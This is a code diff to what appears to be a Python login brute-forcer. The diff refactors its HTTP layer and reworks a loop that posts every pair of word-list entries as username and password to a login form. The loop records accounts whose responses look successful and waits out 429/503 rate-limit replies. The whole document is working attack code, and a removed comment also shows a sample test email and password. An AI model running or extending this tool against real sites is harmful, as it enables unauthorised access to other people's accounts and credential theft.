@@ -5,9 +5,10 @@ import time
 from funcs import transform
 from funcs.tokenizer import tokenize_html
 
-# http_requests imports
-from http_requests.Socket import Socket
-from http_requests.HttpRequest import HttpRequest
+# network imports
+from network.Socket import Socket
+from network.HttpRequest import HttpRequest
+from network.HttpResponse import HttpResponse
 
 # utils imports
 from utils.constants import HTTP_CONTENTTYPE_FORMENCODED
@@ -65,39 +66,34 @@ def bruteforce(request, url, host, port, agent,
     for user in all_words:
         for _pass in all_words:
             data = {user_key: user, pass_key: _pass, 'action': action_val}
-            body = request.generate_post_body(content_type,data)
+            body = HttpRequest.generate_post_body(content_type,data)
             content_length = len(body)
             too_many_req = True
             while too_many_req:
-                request.connect()
-                successful = request.send_post_request(url, host, agent, content_type, content_length, body)
-                print(f'User: {user}, Pass: {_pass} -- TEST.')
+                response = request.send_post_request(url, host, 
+                                agent, content_type,
+                                content_length, body)
+                if not response:
+                    too_many_req = False
+                else:
+                    print(f'User: {user}, Pass: {_pass} -- TEST.')
 
-                if successful:
-                    response = request.receive()
-                    # print(f'User: {user}, Pass: {_pass}')
-                    # if user == "bawofafefe@kulmeo.com" and _pass == "Test12345!":
-                    #     print('Should be successful')
-                    
-                    # See if the response contained any words that indicate the login was successful.
-                    if verify_success_resp(tokenize_html(response, True)):
+                    # See if the response contained any words that indicate a successful login.
+                    if verify_success_resp(tokenize_html(response.response,True)):
                         print(f'    SUCCESS.')
                         if user.lower() not in success_users:
                             success.append(Credential(user.lower(),_pass))
                             success_users.add(user.lower())
                         too_many_req = False
                         continue
-
-                    # Check the status code
-                    _tuple = HttpRequest.get_status_code(response)
-                    if _tuple is not None:
-                        status_code, __ = _tuple
+                    
+                    # Check the status code.
+                    status_tuple = response.status_code
+                    if status_tuple is not None:
+                        status_code, __ = status_tuple
                         print(f'     {status_code}')
                         if status_code == "429" or status_code == "503":
                             time.sleep(sleep_time)
                         else:
                             too_many_req = False
-                else:
-                    too_many_req = False
-                request.close()
     return success
